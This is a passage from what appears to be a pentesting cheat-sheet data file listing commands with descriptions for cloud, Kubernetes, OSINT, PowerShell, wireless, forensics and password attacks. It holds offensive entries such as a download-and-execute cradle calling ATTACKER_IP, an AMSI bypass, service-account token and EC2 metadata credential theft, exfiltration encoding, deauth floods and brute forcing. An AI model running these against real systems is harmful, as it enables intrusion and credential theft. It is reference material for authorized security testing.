        cmd: 'kubectl exec -it POD_NAME -- /bin/bash',
        desc: 'Get an interactive shell inside a running pod',
      },
      {
        cmd: 'kubectl describe pod POD_NAME',
        desc: 'Show pod details including volumes, env vars, and events',
      },
      {
        cmd: 'kubectl logs POD_NAME',
        desc: 'View logs from a pod container',
      },
      {
        cmd: 'kubectl get configmaps --all-namespaces',
        desc: 'List all configmaps (may contain sensitive configuration)',
      },
      {
        cmd: 'kubectl get configmap CM_NAME -o yaml',
        desc: 'Read the full contents of a configmap',
      },
      {
        cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
        desc: 'Read the mounted service account JWT token from inside a pod',
      },
      {
        cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace',
        desc: 'Read the current namespace from inside a pod',
      },
      {
        cmd: 'curl -k https://KUBERNETES_SERVICE_HOST:443/api/v1/namespaces/default/pods -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"',
        desc: 'Query the API server from inside a pod using the SA token',
      },
      {
        cmd: 'kubectl get nodes',
        desc: 'List all cluster nodes and their status',
      },
      {
        cmd: 'kubectl get namespaces',
        desc: 'List all namespaces in the cluster',
      },
      {
        cmd: 'kubectl get networkpolicies --all-namespaces',
        desc: 'List network policies (absence means unrestricted pod communication)',
      },
      {
        cmd: 'kubectl cluster-info',
        desc: 'Show cluster control plane endpoint information',
      },
    ],
  },

  // =========================================================================
  // 19. Cloud AWS
  // =========================================================================
  {
    name: 'Cloud AWS',
    desc: 'AWS security -- S3, IAM, EC2 metadata, Lambda, Secrets Manager',
    items: [
      {
        cmd: 'aws sts get-caller-identity',
        desc: 'Show current AWS identity (account ID, user/role ARN)',
      },
      {
        cmd: 'aws s3 ls',
        desc: 'List all S3 buckets in the account',
      },
      {
        cmd: 'aws s3 ls s3://BUCKET_NAME',
        desc: 'List objects in a specific S3 bucket',
      },
      {
        cmd: 'aws s3 ls s3://BUCKET_NAME --recursive',
        desc: 'Recursively list all objects in a bucket',
      },
      {
        cmd: 'aws s3 cp s3://BUCKET_NAME/file .',
        desc: 'Download a file from S3 to current directory',
      },
      {
        cmd: 'aws s3 cp file s3://BUCKET_NAME/',
        desc: 'Upload a file to an S3 bucket',
      },
      {
        cmd: 'aws s3api get-bucket-acl --bucket BUCKET_NAME',
        desc: 'Check the ACL permissions on an S3 bucket',
      },
      {
        cmd: 'aws s3api get-bucket-policy --bucket BUCKET_NAME',
        desc: 'Retrieve the bucket policy document',
      },
      {
        cmd: 'aws iam list-users',
        desc: 'List all IAM users in the account',
      },
      {
        cmd: 'aws iam list-roles',
        desc: 'List all IAM roles in the account',
      },
      {
        cmd: 'aws iam list-attached-user-policies --user-name USER',
        desc: 'List managed policies attached to a specific user',
      },
      {
        cmd: 'aws iam list-user-policies --user-name USER',
        desc: 'List inline policies embedded in a user',
      },
      {
        cmd: 'aws iam get-policy-version --policy-arn ARN --version-id v1',
        desc: 'Retrieve the actual policy document (permissions)',
      },
      {
        cmd: 'aws iam list-access-keys --user-name USER',
        desc: 'List access keys associated with a user',
      },
      {
        cmd: 'aws ec2 describe-instances',
        desc: 'List all EC2 instances and their details',
      },
      {
        cmd: 'aws ec2 describe-security-groups',
        desc: 'List security groups and their inbound/outbound rules',
      },
      {
        cmd: 'curl http://169.254.169.254/latest/meta-data/',
        desc: 'Query EC2 instance metadata service (IMDSv1)',
      },
      {
        cmd: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        desc: 'Get the IAM role name from instance metadata',
      },
      {
        cmd: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME',
        desc: 'Retrieve temporary IAM credentials from instance metadata',
      },
      {
        cmd: 'aws lambda list-functions',
        desc: 'List all Lambda functions in the account',
      },
      {
        cmd: 'aws lambda get-function --function-name FUNCTION_NAME',
        desc: 'Get Lambda function details and code download URL',
      },
      {
        cmd: 'aws secretsmanager list-secrets',
        desc: 'List all secrets stored in Secrets Manager',
      },
      {
        cmd: 'aws secretsmanager get-secret-value --secret-id SECRET_NAME',
        desc: 'Retrieve a secret value from Secrets Manager',
      },
      {
        cmd: 'aws ssm describe-parameters',
        desc: 'List all SSM Parameter Store parameters',
      },
      {
        cmd: 'aws ssm get-parameter --name PARAM_NAME --with-decryption',
        desc: 'Get a decrypted SSM parameter value',
      },
      {
        cmd: 'enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY',
        desc: 'Enumerate effective IAM permissions for a set of credentials',
      },
    ],
  },

  // =========================================================================
  // 20. OSINT
  // =========================================================================
  {
    name: 'OSINT',
    desc: 'Open source intelligence -- reconnaissance and information gathering',
    items: [
      {
        cmd: 'theHarvester -d DOMAIN -b google,bing,yahoo',
        desc: 'Gather emails, hosts, subdomains from search engines',
      },
      {
        cmd: 'theHarvester -d DOMAIN -b linkedin',
        desc: 'Harvest employee names and info from LinkedIn',
      },
      {
        cmd: 'theHarvester -d DOMAIN -b all',
        desc: 'Enumerate using all available data sources',
      },
      {
        cmd: 'shodan search "hostname:DOMAIN"',
        desc: 'Shodan: search for hosts associated with a domain',
      },
      {
        cmd: 'shodan host TARGET',
        desc: 'Shodan: get detailed host info (ports, services, vulns)',
      },
      {
        cmd: 'shodan search "port:3389 country:US"',
        desc: 'Shodan: find RDP servers in a specific country',
      },
      {
        cmd: 'shodan search "http.title:\\"Dashboard\\""',
        desc: 'Shodan: find exposed web dashboards by page title',
      },
      {
        cmd: 'amass enum -d DOMAIN',
        desc: 'Amass: passive subdomain enumeration',
      },
      {
        cmd: 'amass enum -d DOMAIN -active',
        desc: 'Amass: active subdomain enumeration with DNS resolution',
      },
      {
        cmd: 'subfinder -d DOMAIN',
        desc: 'Subfinder: fast passive subdomain discovery',
      },
      {
        cmd: 'subfinder -d DOMAIN -o subs.txt',
        desc: 'Subfinder: save discovered subdomains to file',
      },
      {
        cmd: 'site:DOMAIN filetype:pdf',
        desc: 'Google dork: find PDF documents hosted on a domain',
      },
      {
        cmd: 'site:DOMAIN inurl:admin',
        desc: 'Google dork: find admin panels on a domain',
      },
      {
        cmd: 'site:DOMAIN intitle:"index of"',
        desc: 'Google dork: find open directory listings',
      },
      {
        cmd: 'site:DOMAIN ext:sql | ext:db | ext:log',
        desc: 'Google dork: find exposed database and log files',
      },
      {
        cmd: '"DOMAIN" intext:password filetype:log',
        desc: 'Google dork: find passwords in log files',
      },
      {
        cmd: 'whois DOMAIN',
        desc: 'WHOIS lookup for domain registration and ownership info',
      },
      {
        cmd: 'dig DOMAIN ANY',
        desc: 'DNS lookup for all available record types',
      },
      {
        cmd: 'dig DOMAIN MX',
        desc: 'DNS lookup for mail exchange (MX) records',
      },
      {
        cmd: 'dnsrecon -d DOMAIN',
        desc: 'DNS enumeration with zone transfer attempt',
      },
      {
        cmd: 'fierce --domain DOMAIN',
        desc: 'DNS recon and non-contiguous subdomain discovery',
      },
      {
        cmd: 'waybackurls DOMAIN',
        desc: 'Fetch historical URLs from the Wayback Machine',
      },
      {
        cmd: 'gau DOMAIN',
        desc: 'Fetch known URLs from AlienVault, Wayback, and other sources',
      },
      {
        cmd: 'curl -s "https://crt.sh/?q=%.DOMAIN&output=json" | jq -r ".[].name_value" | sort -u',
        desc: 'Enumerate subdomains via certificate transparency logs',
      },
    ],
  },

  // =========================================================================
  // 21. Bash One-Liners
  // =========================================================================
  {
    name: 'Bash One-Liners',
    desc: 'Useful shell one-liners for pentesting, recon, and system administration',
    items: [
      {
        cmd: 'for i in $(seq 1 254); do ping -c 1 -W 1 10.10.10.$i | grep "64 bytes" &; done; wait',
        desc: 'Ping sweep an entire /24 subnet in parallel',
      },
      {
        cmd: 'for port in $(seq 1 65535); do (echo > /dev/tcp/TARGET/$port) 2>/dev/null && echo "Port $port open"; done',
        desc: 'Pure bash TCP port scanner (no external tools needed)',
      },
      {
        cmd: 'while read user; do id "$user" 2>/dev/null; done < users.txt',
        desc: 'Check which usernames from a list exist on the system',
      },
      {
        cmd: 'find / -name "*.txt" -exec grep -l "password" {} \\; 2>/dev/null',
        desc: 'Recursively search all text files for the word "password"',
      },
      {
        cmd: 'find / -newer /tmp/timestamp -type f 2>/dev/null',
        desc: 'Find files modified more recently than a reference file',
      },
      {
        cmd: 'grep -rn "password" /etc/ 2>/dev/null',
        desc: 'Recursively grep /etc/ for "password" with line numbers',
      },
      {
        cmd: "awk -F: '$3 == 0 {print $1}' /etc/passwd",
        desc: 'Find users with UID 0 (root-equivalent accounts)',
      },
      {
        cmd: "awk -F: '$7 != \"/usr/sbin/nologin\" && $7 != \"/bin/false\" {print $1, $7}' /etc/passwd",
        desc: 'List all users who have a login shell',
      },
      {
        cmd: 'diff <(ls -la /dir1) <(ls -la /dir2)',
        desc: 'Compare directory listings using process substitution',
      },
      {
        cmd: 'tar czf - /path/to/dir | base64 -w0',
        desc: 'Compress and Base64-encode a directory for exfiltration',
      },
      {
        cmd: 'echo "BASE64_STRING" | base64 -d | tar xzf -',
        desc: 'Decode and extract a Base64-encoded tar archive',
      },
      {
        cmd: 'cat /dev/urandom | tr -dc "a-zA-Z0-9" | head -c 32; echo',
        desc: 'Generate a random 32-character alphanumeric string',
      },
      {
        cmd: 'openssl passwd -6 -salt xyz PASSWORD',
        desc: 'Generate a SHA-512 crypt password hash for /etc/shadow',
      },
      {
        cmd: "ss -tlnp | awk '{print $4}' | sort -u",
        desc: 'Extract unique listening addresses and ports',
      },
      {
        cmd: 'for ip in $(cat hosts.txt); do nmap -sV -Pn -p 80,443 $ip -oG - ; done',
        desc: 'Iterate over a hosts file and scan specific ports',
      },
      {
        cmd: 'while IFS= read -r line; do echo "$line"; done < file.txt',
        desc: 'Read a file line by line preserving whitespace',
      },
      {
        cmd: 'sort file.txt | uniq -c | sort -rn | head -20',
        desc: 'Count occurrences and display the top 20 most frequent',
      },
      {
        cmd: 'comm -23 <(sort file1.txt) <(sort file2.txt)',
        desc: 'Find lines unique to file1 (not present in file2)',
      },
      {
        cmd: 'curl -s ifconfig.me',
        desc: 'Get your external/public IP address',
      },
      {
        cmd: 'watch -n 5 "netstat -tlnp"',
        desc: 'Monitor listening ports every 5 seconds',
      },
      {
        cmd: 'ls -la /proc/*/exe 2>/dev/null | grep deleted',
        desc: 'Find running processes whose binary has been deleted',
      },
    ],
  },

  // =========================================================================
  // 22. Python for Pentesting
  // =========================================================================
  {
    name: 'Python for Pentesting',
    desc: 'Python snippets for networking, HTTP, packet crafting, and exploitation',
    items: [
      {
        cmd: "python3 -c \"import socket; s=socket.socket(); s.connect(('TARGET',RPORT)); s.send(b'Hello\\n'); print(s.recv(1024)); s.close()\"",
        desc: 'Basic TCP client: connect, send data, receive response',
      },
      {
        cmd: "python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0',LPORT)); s.listen(1); c,a=s.accept(); print(c.recv(1024)); c.close()\"",
        desc: 'Basic TCP server: bind, listen, accept, receive',
      },
      {
        cmd: "python3 -c \"import requests; r=requests.get('http://TARGET'); print(r.status_code, r.headers)\"",
        desc: 'HTTP GET request and print status code and headers',
      },
      {
        cmd: "python3 -c \"import requests; r=requests.post('http://TARGET/login', data={'user':'admin','pass':'test'}); print(r.text)\"",
        desc: 'HTTP POST request with form data',
      },
      {
        cmd: "python3 -c \"import requests; r=requests.get('http://TARGET', proxies={'http':'http://127.0.0.1:8080'}); print(r.text)\"",
        desc: 'Route HTTP request through Burp proxy for inspection',
      },
      {
        cmd: "python3 -c \"from scapy.all import *; ans=sr1(IP(dst='TARGET')/ICMP()); print(ans.summary())\"",
        desc: 'Scapy: send an ICMP echo request and print response',
      },
      {
        cmd: "python3 -c \"from scapy.all import *; ans,_=sr(IP(dst='TARGET')/TCP(dport=(1,1024),flags='S'),timeout=2); ans.summary()\"",
        desc: 'Scapy: SYN scan ports 1-1024',
      },
      {
        cmd: "python3 -c \"from scapy.all import *; sniff(filter='tcp port 80', count=10, prn=lambda x: x.summary())\"",
        desc: 'Scapy: sniff 10 packets on TCP port 80',
      },
      {
        cmd: "python3 -c \"from scapy.all import *; wrpcap('capture.pcap', sniff(count=100))\"",
        desc: 'Scapy: capture 100 packets and save to a pcap file',
      },
      {
        cmd: "python3 -c \"from scapy.all import *; send(IP(dst='TARGET')/TCP(dport=80,flags='S'), count=100)\"",
        desc: 'Scapy: send 100 SYN packets (authorized testing only)',
      },
      {
        cmd: "python3 -c \"from pwn import *; r=remote('TARGET',RPORT); print(r.recv(1024)); r.interactive()\"",
        desc: 'Pwntools: connect to a service and enter interactive mode',
      },
      {
        cmd: 'python3 -c "from pwn import *; print(cyclic(200))"',
        desc: 'Pwntools: generate a cyclic pattern for buffer overflow offset finding',
      },
      {
        cmd: 'python3 -c "from pwn import *; print(cyclic_find(0x61616166))"',
        desc: 'Pwntools: calculate offset from a cyclic pattern value',
      },
      {
        cmd: 'python3 -c "from pwn import *; print(shellcraft.sh())"',
        desc: 'Pwntools: generate assembly shellcode for /bin/sh',
      },
      {
        cmd: "python3 -c \"import hashlib; print(hashlib.md5(b'password').hexdigest())\"",
        desc: 'Hash a string with MD5',
      },
      {
        cmd: "python3 -c \"import hashlib; print(hashlib.sha256(b'password').hexdigest())\"",
        desc: 'Hash a string with SHA-256',
      },
      {
        cmd: "python3 -c \"import base64; print(base64.b64encode(b'payload').decode())\"",
        desc: 'Base64 encode a byte string',
      },
      {
        cmd: "python3 -c \"import base64; print(base64.b64decode('cGF5bG9hZA==').decode())\"",
        desc: 'Base64 decode a string',
      },
      {
        cmd: "python3 -c \"import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))\"",
        desc: 'URL-encode a string for payload delivery',
      },
      {
        cmd: 'python3 -m http.server 8000 --bind 0.0.0.0',
        desc: 'Start an HTTP file server on all interfaces',
      },
    ],
  },

  // =========================================================================
  // 23. PowerShell for Pentesting
  // =========================================================================
  {
    name: 'PowerShell for Pentesting',
    desc: 'PowerShell commands for download cradles, enumeration, and bypass techniques',
    items: [
      {
        cmd: 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")',
        desc: 'Download and execute a PowerShell script in memory',
      },
      {
        cmd: 'Invoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile C:\\Temp\\file',
        desc: 'Download a file to disk with Invoke-WebRequest',
      },
      {
        cmd: '(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP/file","C:\\Temp\\file")',
        desc: 'Download a file to disk using WebClient object',
      },
      {
        cmd: 'powershell -ep bypass',
        desc: 'Launch PowerShell with execution policy bypassed',
      },
      {
        cmd: 'Set-ExecutionPolicy Bypass -Scope Process',
        desc: 'Bypass execution policy for the current process only',
      },
      {
        cmd: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        desc: 'AMSI bypass using basic .NET reflection technique',
      },
      {
        cmd: 'Get-Process',
        desc: 'List all running processes',
      },
      {
        cmd: 'Get-Service | Where-Object {$_.Status -eq "Running"}',
        desc: 'List all currently running Windows services',
      },
      {
        cmd: 'Get-LocalUser',
        desc: 'List all local user accounts',
      },
      {
        cmd: 'Get-LocalGroupMember -Group "Administrators"',
        desc: 'List members of the local Administrators group',
      },
      {
        cmd: 'Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.ini,*.cfg -ErrorAction SilentlyContinue',
        desc: 'Recursively search for configuration and text files',
      },
      {
        cmd: 'Get-ChildItem -Path C:\\Users -Recurse -Include *.kdbx,*.key -ErrorAction SilentlyContinue',
        desc: 'Search user directories for KeePass files and key files',
      },
      {
        cmd: 'Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts',
        desc: 'Read the Windows hosts file',
      },
      {
        cmd: 'Get-NetTCPConnection -State Listen',
        desc: 'List all TCP ports currently in listening state',
      },
      {
        cmd: 'Test-NetConnection -ComputerName TARGET -Port 80',
        desc: 'Test if a specific TCP port is open on a target',
      },
      {
        cmd: '1..1024 | ForEach-Object { $p=$_; try { (New-Object Net.Sockets.TcpClient).Connect("TARGET",$p); "Port $p open" } catch {} }',
        desc: 'PowerShell port scanner for ports 1-1024',
      },
      {
        cmd: 'Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Description',
        desc: 'Active Directory: list all users with their descriptions',
      },
      {
        cmd: 'Get-ADComputer -Filter * -Properties * | Select-Object Name,OperatingSystem',
        desc: 'Active Directory: list all computers with OS info',
      },
      {
        cmd: 'Get-ADGroupMember -Identity "Domain Admins"',
        desc: 'Active Directory: list Domain Admins group members',
      },
      {
        cmd: 'Get-DomainUser -SPN | Select-Object SamAccountName,ServicePrincipalName',
        desc: 'PowerView: find Kerberoastable service accounts',
      },
      {
        cmd: 'Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion',
        desc: 'List all installed software from the registry',
      },
      {
        cmd: '$cred = Get-Credential; Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }',
        desc: 'Execute a remote command using explicit credentials',
      },
    ],
  },

  // =========================================================================
  // 24. Web Enumeration
  // =========================================================================
  {
    name: 'Web Enumeration',
    desc: 'Web application reconnaissance, fingerprinting, and parameter discovery',
    items: [
      {
        cmd: 'whatweb http://TARGET',
        desc: 'Identify web technologies, CMS, and frameworks',
      },
      {
        cmd: 'nikto -h http://TARGET',
        desc: 'Run a comprehensive web server vulnerability scan',
      },
      {
        cmd: 'nikto -h http://TARGET -ssl',
        desc: 'Nikto scan over HTTPS',
      },
      {
        cmd: 'nikto -h http://TARGET -Tuning 9',
        desc: 'Nikto scan tuned for SQL injection tests',
      },
      {
        cmd: 'dirb http://TARGET WORDLIST',
        desc: 'Directory brute force using dirb',
      },
      {
        cmd: 'dirb http://TARGET WORDLIST -X .php,.html,.txt',
        desc: 'Dirb scan with specific file extension search',
      },
      {
        cmd: 'ffuf -u http://TARGET/FUZZ -w WORDLIST',
        desc: 'Fast directory fuzzing with ffuf',
        example: 'ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt',
      },
      {
        cmd: 'ffuf -u http://TARGET/FUZZ -w WORDLIST -e .php,.html,.txt,.bak',
        desc: 'ffuf with multiple file extensions appended',
      },
      {
        cmd: 'ffuf -u http://TARGET/FUZZ -w WORDLIST -fc 404',
        desc: 'ffuf: filter out 404 responses from results',
      },
      {
        cmd: 'ffuf -u http://TARGET/FUZZ -w WORDLIST -fs 1234',
        desc: 'ffuf: filter by specific response body size',
      },
      {
        cmd: 'ffuf -u http://TARGET/ -w WORDLIST -H "Host: FUZZ.TARGET"',
        desc: 'ffuf: virtual host (vhost) discovery',
      },
      {
        cmd: 'ffuf -u http://TARGET/page?FUZZ=value -w WORDLIST',
        desc: 'ffuf: discover hidden GET parameter names',
      },
      {
        cmd: 'ffuf -u http://TARGET/page?id=FUZZ -w numbers.txt',
        desc: 'ffuf: fuzz a parameter value (e.g., IDOR testing)',
      },
      {
        cmd: 'wfuzz -u http://TARGET/FUZZ -w WORDLIST --hc 404',
        desc: 'wfuzz: directory brute force hiding 404 responses',
      },
      {
        cmd: 'wfuzz -u http://TARGET/page?id=FUZZ -w WORDLIST --hh 1234',
        desc: 'wfuzz: parameter fuzzing hiding by response character count',
      },
      {
        cmd: 'curl -s -o /dev/null -w "%{http_code}" http://TARGET/path',
        desc: 'Silently check the HTTP status code of a URL',
      },
      {
        cmd: 'curl -I http://TARGET',
        desc: 'Fetch only HTTP response headers',
      },
      {
        cmd: 'curl -s http://TARGET/robots.txt',
        desc: 'Check robots.txt for disallowed (potentially interesting) paths',
      },
      {
        cmd: 'curl -s http://TARGET/sitemap.xml',
        desc: 'Check sitemap.xml for site URL structure',
      },
      {
        cmd: 'curl -s http://TARGET/.well-known/security.txt',
        desc: 'Check for security.txt disclosure file',
      },
      {
        cmd: 'arjun -u http://TARGET/page',
        desc: 'Arjun: automatic HTTP parameter name discovery',
      },
      {
        cmd: 'gospider -s http://TARGET -d 3 -c 10',
        desc: 'Fast web crawling for endpoint and link discovery',
      },
      {
        cmd: 'nuclei -u http://TARGET -t cves/',
        desc: 'Nuclei: run CVE-based vulnerability detection templates',
      },
      {
        cmd: 'nuclei -u http://TARGET -t technologies/',
        desc: 'Nuclei: detect technologies and frameworks',
      },
    ],
  },

  // =========================================================================
  // 25. Wireless Attacks
  // =========================================================================
  {
    name: 'Wireless Attacks',
    desc: 'WiFi security testing with aircrack-ng, WPA/WPA2 cracking, evil twin',
    items: [
      {
        cmd: 'airmon-ng start IFACE',
        desc: 'Enable monitor mode on a wireless interface',
      },
      {
        cmd: 'airmon-ng stop IFACE_MON',
        desc: 'Disable monitor mode and restore managed mode',
      },
      {
        cmd: 'airmon-ng check kill',
        desc: 'Kill processes that might interfere with monitor mode',
      },
      {
        cmd: 'airodump-ng IFACE_MON',
        desc: 'Scan and display all nearby wireless networks',
      },
      {
        cmd: 'airodump-ng IFACE_MON --bssid BSSID -c CHANNEL -w capture',
        desc: 'Target a specific AP, lock to its channel, and capture to file',
      },
      {
        cmd: 'airodump-ng IFACE_MON --bssid BSSID -c CHANNEL --write-interval 1 -w capture',
        desc: 'Targeted capture with frequent file writes',
      },
      {
        cmd: 'aireplay-ng -0 10 -a BSSID -c CLIENT_MAC IFACE_MON',
        desc: 'Send 10 deauth frames to force a WPA handshake capture',
      },
      {
        cmd: 'aireplay-ng -0 0 -a BSSID IFACE_MON',
        desc: 'Continuous deauthentication of all clients (use responsibly)',
      },
      {
        cmd: 'aireplay-ng -1 0 -a BSSID -h YOUR_MAC IFACE_MON',
        desc: 'Fake authentication with an access point',
      },
      {
        cmd: 'aireplay-ng -3 -b BSSID -h YOUR_MAC IFACE_MON',
        desc: 'ARP replay attack for WEP cracking',
      },
      {
        cmd: 'aircrack-ng -w WORDLIST capture-01.cap',
        desc: 'Crack a captured WPA/WPA2 handshake with a wordlist',
      },
      {
        cmd: 'aircrack-ng -b BSSID -w WORDLIST capture-01.cap',
        desc: 'Crack a specific BSSID from the capture file',
      },
      {
        cmd: 'aircrack-ng capture-01.cap',
        desc: 'Attempt WEP crack (requires sufficient captured IVs)',
      },
      {
        cmd: 'hcxdumptool -i IFACE_MON -o capture.pcapng --active_beacon --enable_status=15',
        desc: 'Capture PMKID and EAPOL frames with hcxdumptool',
      },
      {
        cmd: 'hcxpcapngtool -o hash.hc22000 capture.pcapng',
        desc: 'Convert wireless capture to hashcat-compatible format',
      },
      {
        cmd: 'hashcat -m 22000 hash.hc22000 WORDLIST',
        desc: 'Crack WPA/WPA2 capture with hashcat GPU acceleration',
      },
      {
        cmd: 'wash -i IFACE_MON',
        desc: 'Scan for WPS-enabled wireless networks',
      },
      {
        cmd: 'reaver -i IFACE_MON -b BSSID -vv',
        desc: 'Brute force WPS PIN to recover WPA/WPA2 passphrase',
      },
      {
        cmd: 'bully -b BSSID -c CHANNEL IFACE_MON',
        desc: 'Alternative WPS brute force tool',
      },
      {
        cmd: 'iwconfig',
        desc: 'Show wireless interface configuration and mode',
      },
      {
        cmd: 'iw dev IFACE scan | grep -E "SSID|signal|freq"',
        desc: 'Scan for nearby APs showing SSID, signal, and frequency',
      },
      {
        cmd: 'hostapd-wpe hostapd-wpe.conf',
        desc: 'Set up an evil twin / rogue AP for credential capture',
      },
      {
        cmd: 'wifite --wpa --dict WORDLIST',
        desc: 'Automated WPA attack tool with wordlist cracking',
      },
    ],
  },

  // =========================================================================
  // 26. Forensics
  // =========================================================================
  {
    name: 'Forensics',
    desc: 'Digital forensics -- memory analysis, file carving, timeline creation',
    items: [
      {
        cmd: 'volatility -f memdump.raw imageinfo',
        desc: 'Identify the OS profile for a memory dump',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE pslist',
        desc: 'List running processes at time of memory capture',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE pstree',
        desc: 'Display process tree showing parent-child relationships',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE psscan',
        desc: 'Scan for hidden or terminated processes',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE netscan',
        desc: 'Show active and closed network connections',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE hashdump',
        desc: 'Dump Windows password hashes from memory',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE filescan',
        desc: 'Scan for file objects in the memory dump',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE dumpfiles -Q OFFSET -D output/',
        desc: 'Dump a specific file from memory by its physical offset',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE cmdline',
        desc: 'Show command-line arguments for all processes',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE consoles',
        desc: 'Extract console/cmd command history from memory',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE malfind',
        desc: 'Detect injected or hidden code in process memory',
      },
      {
        cmd: 'volatility -f memdump.raw --profile=PROFILE hivelist',
        desc: 'List Windows registry hives found in memory',
      },
      {
        cmd: 'binwalk firmware.bin',
        desc: 'Analyze a binary file for embedded files and firmware headers',
      },
      {
        cmd: 'binwalk -e firmware.bin',
        desc: 'Extract embedded files from a binary automatically',
      },
      {
        cmd: 'binwalk --dd=".*" firmware.bin',
        desc: 'Force extract all detected file types from the binary',
      },
      {
        cmd: 'foremost -i disk.dd -o output/',
        desc: 'Carve files from a disk image based on headers and footers',
      },
      {
        cmd: 'scalpel -c scalpel.conf -o output/ disk.dd',
        desc: 'File carving with scalpel and custom configuration',
      },
      {
        cmd: 'strings -n 8 binary_file',
        desc: 'Extract printable ASCII strings (minimum length 8)',
      },
      {
        cmd: 'strings -el binary_file',
        desc: 'Extract wide-character (UTF-16LE/Unicode) strings',
      },
      {
        cmd: 'file unknown_file',
        desc: 'Identify file type using magic byte signatures',
      },
      {
        cmd: 'exiftool image.jpg',
        desc: 'Extract all metadata from an image file',
      },
      {
        cmd: 'exiftool -all= image.jpg',
        desc: 'Strip all metadata from an image file',
      },
      {
        cmd: 'steghide extract -sf image.jpg',
        desc: 'Extract hidden data from an image (steganography)',
      },
      {
        cmd: 'zsteg image.png',
        desc: 'Detect and extract steganography in PNG/BMP images',
      },
      {
        cmd: 'xxd binary_file | head -50',
        desc: 'Display hex dump of the first 50 lines of a file',
      },
      {
        cmd: 'sha256sum file',
        desc: 'Compute SHA-256 hash for file integrity verification',
      },
      {
        cmd: 'md5sum file',
        desc: 'Compute MD5 hash of a file (use SHA-256 for stronger integrity)',
      },
      {
        cmd: 'log2timeline.py timeline.plaso disk.dd',
        desc: 'Create a super timeline from a disk image with Plaso',
      },
      {
        cmd: 'psort.py -o l2tcsv timeline.plaso -w timeline.csv',
        desc: 'Convert Plaso timeline to CSV for analysis in spreadsheets',
      },
    ],
  },

  // =========================================================================
  // 27. Password Attacks
  // =========================================================================
  {
    name: 'Password Attacks',
    desc: 'Wordlist generation, mutation rules, online and offline cracking strategies',
    items: [
      {
        cmd: 'cewl http://TARGET -d 3 -m 5 -w wordlist.txt',
        desc: 'Generate a custom wordlist by spidering a website (depth 3, min 5 chars)',
      },
      {
        cmd: 'cewl http://TARGET -d 3 -m 5 --with-numbers -w wordlist.txt',
        desc: 'CeWL wordlist generation including words with numbers',
      },
      {
        cmd: 'cewl http://TARGET -e -w emails.txt',
        desc: 'CeWL: extract email addresses from a website',
      },
      {
        cmd: 'crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt',
        desc: 'Generate all 6-to-8 character alphanumeric combinations with crunch',
      },
      {
        cmd: 'crunch 8 8 -t @@@@%%%% -o wordlist.txt',
        desc: 'Crunch: pattern-based wordlist (4 lowercase letters + 4 digits)',
      },
      {
        cmd: 'crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha-numeric -o wordlist.txt',
        desc: 'Crunch: generate words using a predefined charset file',
      },
      {
        cmd: 'cupp -i',
        desc: 'CUPP: interactive profiling to generate a targeted wordlist',
      },
      {
        cmd: 'hashid HASH_VALUE',
        desc: 'Identify the type of a hash value',
      },
      {
        cmd: 'hash-identifier',
        desc: 'Interactive tool to identify hash types',
      },
      {
        cmd: 'nth --text "HASH_VALUE"',
        desc: 'Name That Hash: identify hash type with confidence ratings',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET ssh',
        desc: 'Online attack: brute force SSH login with Hydra',
      },
      {
        cmd: 'medusa -h TARGET -u USER -P WORDLIST -M ssh',
        desc: 'Online attack: brute force SSH login with Medusa',
      },
      {
        cmd: 'ncrack -p 22 --user USER -P WORDLIST TARGET',
        desc: 'Online attack: brute force SSH login with Ncrack',
      },
      {
        cmd: 'john --wordlist=WORDLIST HASH_FILE',
        desc: 'Offline attack: crack hashes with John the Ripper',
      },
      {
        cmd: 'hashcat -m 0 -a 0 HASH_FILE WORDLIST',
        desc: 'Offline attack: crack MD5 with hashcat dictionary mode',
      },
      {
        cmd: 'hashcat -m 0 -a 3 HASH_FILE ?a?a?a?a?a?a',
        desc: 'Offline attack: brute force MD5 with hashcat mask',
      },
      {
        cmd: "echo \"password\" | sed 's/a/@/g; s/e/3/g; s/o/0/g; s/i/1/g; s/s/$/g'",
        desc: 'Basic leet speak transformation on a word',
      },
      {
        cmd: "cat WORDLIST | sed 's/$/123/' >> mutated.txt",
        desc: 'Append "123" to every word in a wordlist',
      },
      {
        cmd: 'cat WORDLIST | tr "[:lower:]" "[:upper:]" >> mutated.txt',
        desc: 'Convert all words in a wordlist to uppercase',
      },
      {
        cmd: "cat WORDLIST | awk '{print $0; print toupper($0); print toupper(substr($0,1,1)) substr($0,2)}' | sort -u > mutated.txt",
        desc: 'Generate lowercase, uppercase, and capitalized variants of each word',
      },
      {
